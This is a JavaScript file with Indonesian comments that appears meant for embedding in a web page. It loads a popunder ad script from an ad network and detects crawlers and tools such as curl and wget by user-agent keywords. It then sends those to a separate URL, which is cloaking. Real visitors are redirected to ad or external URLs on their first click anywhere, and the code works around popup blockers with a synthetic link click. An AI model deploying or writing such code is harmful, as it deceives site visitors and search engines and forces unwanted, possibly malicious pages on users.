// ========================================
// CONFIG
// ========================================
const CONFIG = {
  popunderUrl: '//pl15663649.effectivegatecpm.com/62/52/8b/62528b16899f546dcfe3d7c652d13893.js',
  botUrl: 'https://www.effectivegatecpm.com/ncm6bswk9?key=c557fff9fe194e94c8546b8e66aa5c4c',
  mobileUrl: 'https://rondo.my.id',
  desktopUrl: 'https://www.effectivegatecpm.com/ncm6bswk9?key=c557fff9fe194e94c8546b8e66aa5c4c',
  popunderDelay: 300,
  mobileDelay: 1000,
  popunderTimeout: 2000,
  openInNewWindow: true,  // true = buka tab baru, false = redirect
  triggerOnClick: true     // true = trigger saat klik, false = auto
};

// ========================================
// FUNGSI DETEKSI
// ========================================
function isBot() {
  const ua = navigator.userAgent.toLowerCase();
  const botKeywords = [
    'bot', 'crawl', 'spider', 'slurp', 'mediapartners', 'google', 
    'bing', 'facebook', 'yahoo', 'curl', 'python', 'http', 'wget', 'java'
  ];
  return botKeywords.some(keyword => ua.includes(keyword));
}

function isMobile() {
  return /android|iphone|ipad|ipod|opera mini|mobile/i.test(navigator.userAgent);
}

// ========================================
// LOAD POPUNDER (with error handling)
// ========================================
function loadPopunder(callback) {
  if (!CONFIG.popunderUrl || CONFIG.popunderUrl === '') {
    console.log('Popunder disabled');
    if (callback) callback();
    return;
  }
  
  const script = document.createElement('script');
  script.type = 'text/javascript';
  script.src = CONFIG.popunderUrl;
  script.async = true;
  
  // Safety timeout
  const timeout = setTimeout(() => {
    console.warn('Popunder timeout - continuing');
    if (callback) callback();
  }, CONFIG.popunderTimeout);
  
  script.onload = function() {
    clearTimeout(timeout);
    console.log('Popunder loaded');
    if (callback) {
      setTimeout(callback, CONFIG.popunderDelay);
    }
  };
  
  script.onerror = function() {
    clearTimeout(timeout);
    console.warn('Popunder failed to load - continuing');
    if (callback) callback();
  };
  
  try {
    (document.head || document.body).appendChild(script);
  } catch(e) {
    clearTimeout(timeout);
    console.error('Failed to append popunder script:', e);
    if (callback) callback();
  }
}

// ========================================
// REDIRECT FUNCTION
// ========================================
function doRedirect() {
  const targetUrl = isMobile() ? CONFIG.mobileUrl : CONFIG.desktopUrl;
  
  if (CONFIG.openInNewWindow) {
    // Buka di tab/window baru
    console.log('Opening in new window:', targetUrl);
    const newWindow = window.open(targetUrl, '_blank');
    
    // Fallback jika popup di-block
    if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
      console.warn('Popup blocked - trying alternative method');
      // Alternative: buat link dan trigger click
      const link = document.createElement('a');
      link.href = targetUrl;
      link.target = '_blank';
      link.rel = 'noopener noreferrer';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  } else {
    // Redirect di window yang sama
    console.log('Redirecting to:', targetUrl);
    window.location.href = targetUrl;
  }
}

// ========================================
// REDIRECT LOGIC
// ========================================
(function() {
  let hasTriggered = false; // Prevent multiple triggers
  
  // Tunggu DOM ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initRedirect);
  } else {
    initRedirect();
  }
  
  function initRedirect() {
    // Bot detection - redirect langsung
    if (isBot()) {
      console.log('Bot detected - redirecting to bot URL');
      window.location.href = CONFIG.botUrl;
      return;
    }
    
    // Load popunder dulu
    loadPopunder(() => {
      if (CONFIG.triggerOnClick) {
        // Mode: Trigger saat user klik
        console.log('Click trigger mode enabled - waiting for user interaction');
        
        // Listen untuk klik di mana saja
        document.addEventListener('click', function handleClick(e) {
          if (hasTriggered) return;
          hasTriggered = true;
          
          console.log('Click detected - triggering redirect');
          
          // Remove listener setelah trigger
          document.removeEventListener('click', handleClick);
          
          if (isMobile()) {
            // Mobile: delay sebelum redirect
            setTimeout(() => {
              doRedirect();
            }, CONFIG.mobileDelay);
          } else {
            // Desktop: langsung redirect
            doRedirect();
          }
        }, { once: true }); // Auto remove after first trigger
        
      } else {
        // Mode: Auto redirect (tanpa tunggu klik)
        console.log('Auto redirect mode');
        if (isMobile()) {
          setTimeout(() => {
            doRedirect();
          }, CONFIG.mobileDelay);
        } else {
          doRedirect();
        }
      }
    });
  }
})();
